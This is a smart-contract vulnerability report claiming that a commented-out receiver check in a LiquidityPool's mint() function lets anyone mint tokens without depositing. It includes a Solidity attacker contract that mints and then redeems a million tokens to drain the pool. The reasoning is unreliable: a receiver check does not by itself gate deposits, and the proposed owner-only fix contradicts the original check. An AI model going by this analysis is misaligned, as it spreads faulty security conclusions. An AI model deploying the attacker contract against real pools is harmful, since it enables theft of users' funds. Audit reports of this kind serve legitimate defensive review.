# Vulnerability details

## Impact
The `mint()` function in ``LiquidityPool` contract contains a critical vulnerability that would allow an attacker to mint new tokens without needing to deposit any assets.
This is due to an access control check being commented out in the mint() function:

```
// require(receiver == msg.sender, "LiquidityPool/not-authorized-to-mint");
```
With this check commented out, any user can call the mint() function and specify any address as the receiver to mint new tokens.

This vulnerability would allow any user to mint arbitrary amounts of new tokens to themselves or any address.
Attackers could exploit this to drain significant value from the pool by minting tokens and redeeming them for assets.

## Proof of Concept
```
// Attacker contract
contract Attacker {

  LiquidityPool pool; 

  // Initialize pool contract
  constructor(address _pool) {
    pool = LiquidityPool(_pool);
  }

  // Function to exploit vulnerability
  function attack() external {
    // Mint 1 million tokens to attacker's address
    pool.mint(1000000 * 10**18, address(this));

    // Redeem minted tokens 
    pool.redeem(1000000 * 10**18, address(this), address(this)); 
  }

}
```

## Tools Used
Manual observation

## Recommended Mitigation Steps

Uncomment the access control check in mint() to restrict minting only to the pool owner:
```
require(receiver == owner(), "Not authorized");
```



## Assessed type

Access Control
